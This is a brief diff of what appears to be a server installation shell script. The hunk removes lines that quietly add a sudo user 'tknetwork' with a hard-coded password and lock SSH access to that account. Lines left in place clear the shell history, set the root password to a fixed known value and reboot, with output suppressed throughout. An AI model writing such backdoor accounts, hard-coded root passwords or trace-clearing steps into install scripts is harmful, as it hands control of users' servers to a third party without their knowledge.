@@ -850,10 +850,7 @@ sudo apt-get autoremove -y > /dev/null 2>&1
 sudo apt-get clean > /dev/null 2>&1
 history -c
 cd /root || exit
- useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
-    service sshd restart
+
 echo -e "\e[1;32m Installing Done \033[0m"
 echo 'root:JAN022011b' | sudo chpasswd
 reboot
